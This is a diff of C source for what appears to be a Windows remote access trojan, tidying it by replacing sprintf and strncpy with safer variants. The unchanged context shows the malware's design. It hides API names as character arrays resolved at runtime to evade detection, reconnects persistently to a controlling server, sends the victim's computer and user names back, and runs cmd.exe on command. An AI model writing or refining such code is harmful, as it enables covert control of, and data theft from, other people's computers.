@@ -34,7 +34,7 @@ int SocketSend(RATSocket* ratSocket, char* messageBuffer)
 	if ( f_send(ratSocket->socketConnection, messageBuffer, (int)strlen(messageBuffer), 0) == SOCKET_ERROR )
 	{
 		char buffer[256];
-		sprintf(buffer, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
+		sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket->f_WSAGetLastError());
 		OutputDebugStringA(buffer);
 		return 1;
 	}
@@ -61,7 +61,7 @@ WinMain(HINSTANCE hInstance,
 	char ca_WSAStartup[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
 	ratSocket.f_WSAGetLastError = (_WSAGetLastError*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAGetLastError);
 	
-	while(true)
+	for(;;)
 	{
 		WSADATA wsaData;
 
@@ -79,7 +79,7 @@ WinMain(HINSTANCE hInstance,
 		if ( ratSocket.socketConnection == INVALID_SOCKET )
 		{	
 			char buffer[256];
-			sprintf(buffer, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
+			sprintf_s(buffer, "Socket failed with error: %ld\n", ratSocket.f_WSAGetLastError());
 			OutputDebugStringA(buffer);
 
 			char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
@@ -112,7 +112,7 @@ WinMain(HINSTANCE hInstance,
 		else
 		{
 			char buffer[256];
-			sprintf(buffer, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
+			sprintf_s(buffer, "Socket failed with error: %ld\nReconnecting...\n", ratSocket.f_WSAGetLastError());
 			OutputDebugStringA(buffer);
 
 			// Try to reconnect
@@ -134,7 +134,7 @@ WinMain(HINSTANCE hInstance,
 	char ca_recv[] = { 'r','e','c','v', 0 };
 	_recv* f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
 
-	while(1)
+	for(;;)
 	{
 		char recvBuffer[SOCKET_BUFFER_SIZE] = {};
 		if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
@@ -169,10 +169,10 @@ WinMain(HINSTANCE hInstance,
 			
 			if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
 			{
-				sprintf(bufferError, "Could not get computer name: %ld\n", GetLastError());
+				sprintf_s(bufferError, "Could not get computer name: %ld\n", GetLastError());
 				OutputDebugStringA(bufferError);
 
-				strncpy(bufferComputer, ca_unknown, sizeof(ca_unknown));
+				strncpy_s(bufferComputer, ca_unknown, sizeof(ca_unknown));
 			}
 
 			char ca_advapi32[256] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
@@ -188,14 +188,14 @@ WinMain(HINSTANCE hInstance,
 
 			if ( f_GetUserNameA(bufferUser, &len) <= 0 )
 			{
-				sprintf(bufferError, "Could not get username: %ld\n", GetLastError());
+				sprintf_s(bufferError, "Could not get username: %ld\n", GetLastError());
 				OutputDebugStringA(bufferError);
 
-				strncpy(bufferUser, ca_unknown, sizeof(ca_unknown));
+				strncpy_s(bufferUser, ca_unknown, sizeof(ca_unknown));
 			}
 
 			char bufferInfo[256];
-			sprintf(bufferInfo, "%s:%s", bufferComputer, bufferUser);
+			sprintf_s(bufferInfo, "%s:%s", bufferComputer, bufferUser);
 			SocketSend(&ratSocket, bufferInfo);
 		}
 		else if ( strcmp(recvBuffer, ca_cmd) == 0 )
@@ -211,14 +211,14 @@ WinMain(HINSTANCE hInstance,
 			GetSystemDirectoryA(cmdPath, MAX_PATH);
 
 			char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
-			strncat(cmdPath, ca_cmdexe, 8);
+			strncat_s(cmdPath, ca_cmdexe, 8);
 
 			char *cmdArg = "/C dir > X:\\output\\test.txt";
 	
 			if ( !CreateProcess(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
 			{
 				char bufferError[256];
-				sprintf(bufferError, "CreateProcess failed (%d).\n", GetLastError());
+				sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
 				OutputDebugStringA(bufferError);
 			}
 
